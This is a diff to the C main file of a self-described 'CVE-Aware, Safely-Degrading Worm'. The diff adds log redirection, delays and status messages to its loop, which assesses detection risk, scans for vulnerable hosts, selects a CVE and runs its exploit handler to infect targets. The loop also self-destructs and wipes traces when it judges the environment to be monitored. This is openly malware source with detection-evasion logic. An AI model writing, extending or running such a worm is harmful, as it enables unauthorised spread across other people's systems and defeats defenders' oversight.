@@ -13,6 +13,7 @@
 
 // Configuration
 #define REMOTE_WORM_PATH "/tmp/worm"
+#define WORM_LOG_PATH "/tmp/worm.log"
 
 // Phase 1: Scan
 // Calls all registered scan handlers
@@ -76,6 +77,20 @@ static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) 
 int main(int argc, char* argv[]) {
     (void)argc;
     
+    // Redirect stdout and stderr to log file for persistent logging
+    // This allows us to view worm activity via: tail -f /tmp/worm.log
+    FILE* log_file = freopen(WORM_LOG_PATH, "a", stdout);
+    if (log_file == NULL) {
+        // If we can't open log file, continue without logging
+        // (this allows worm to still work even if log file can't be created)
+    }
+    // Also redirect stderr to the same log file
+    freopen(WORM_LOG_PATH, "a", stderr);
+    
+    // Flush to ensure logs are written immediately
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+    
     printf("=== CVE-Aware, Safely-Degrading Worm ===\n");
     
     init_handler_registry();
@@ -89,6 +104,8 @@ int main(int argc, char* argv[]) {
         printf("\n[*] Starting infection round...\n");
         
         // Phase 0: Risk Assessment - evaluates detection signals before any operations
+        printf("[*] Phase 0: Risk Assessment - waiting 3 seconds...\n");
+        sleep(3);
         risk_assessment_t risk = assess_risk();
         printf("\n=== RISK ASSESSMENT ===\n");
         printf("[*] Total Risk: %d/10\n", risk.total_risk);
@@ -99,7 +116,12 @@ int main(int argc, char* argv[]) {
         // Critical risk threshold: self-destruct to avoid detection
         if (risk.total_risk >= 7) {
             printf("\n[!] CRITICAL RISK DETECTED (>= 7/10)\n");
+            printf("[!] Risk level exceeds safe threshold for continued operation\n");
+            if (risk.system_risk >= 10) {
+                printf("[!] High-risk server environment detected (monitored/security environment)\n");
+            }
             printf("[!] Entering SELF-DESTRUCTION mode...\n");
+            printf("[!] Cleaning up all traces and exiting to avoid detection\n");
             self_destruct();
             break;
         }
@@ -115,6 +137,8 @@ int main(int argc, char* argv[]) {
         
         // Phase 1: Scan - call all scan handlers
         // Each handler decides what to scan (local or remote) internally
+        printf("\n[*] Phase 1: Scan - waiting 3 seconds...\n");
+        sleep(3);
         printf("\n=== SCAN PHASE ===\n");
         cve_result_vector_t scan_results = phase1_scan(NULL);
         printf("[*] Scan complete: %d CVE handler(s) checked\n", scan_results.count);
@@ -139,6 +163,8 @@ int main(int argc, char* argv[]) {
         }
         
         // Phase 2: Decision - select best CVE based on priority and conditions
+        printf("\n[*] Phase 2: Decision - waiting 3 seconds...\n");
+        sleep(3);
         printf("\n=== DECISION PHASE ===\n");
         decision_result_t decision = phase2_decision(&scan_results, &risk);
         
@@ -152,6 +178,8 @@ int main(int argc, char* argv[]) {
             
             // Phase 3: Execute - run the selected CVE's execution handler
             // Execution handler uses vulnerable hosts discovered during scan phase
+            printf("\n[*] Phase 3: Execute - waiting 3 seconds...\n");
+            sleep(3);
             printf("\n=== EXECUTION PHASE ===\n");
             printf("[*] Executing CVE ID %d...\n", decision.selected_cve_id);
             if (phase3_execute(decision.selected_cve_id, NULL, argv[0])) {
